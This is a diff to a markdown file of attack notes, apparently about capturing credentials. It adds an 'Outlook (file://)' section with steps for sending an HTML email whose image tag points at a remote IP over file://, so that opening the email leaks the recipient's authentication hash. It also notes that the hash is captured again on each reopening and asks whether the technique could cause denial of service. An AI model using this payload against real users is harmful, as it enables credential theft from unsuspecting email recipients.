@@ -74,5 +74,17 @@ DONE...
 
 More on [Symbolic Link](https://en.wikipedia.org/wiki/SYmbolic_LinK_(SYLK)) files
 
-## 2. Excel (.SLK)
+## 2. Outlook (file://)
+
+### Steps:
+1. Create HTML email
+2. `<img src="file://IP/fakeimage.png" />`
+3. Send email! Important!
+
+![](outlook_capture_hash.gif)
+
+NOTE: `the user only needs to download the image once. As the POC shows, once the email is openned again, the hash is captured`
+
+Though: can this be uses as a [DOS attack](https://www.kb.cert.org/vuls/id/867968/)?
+
 
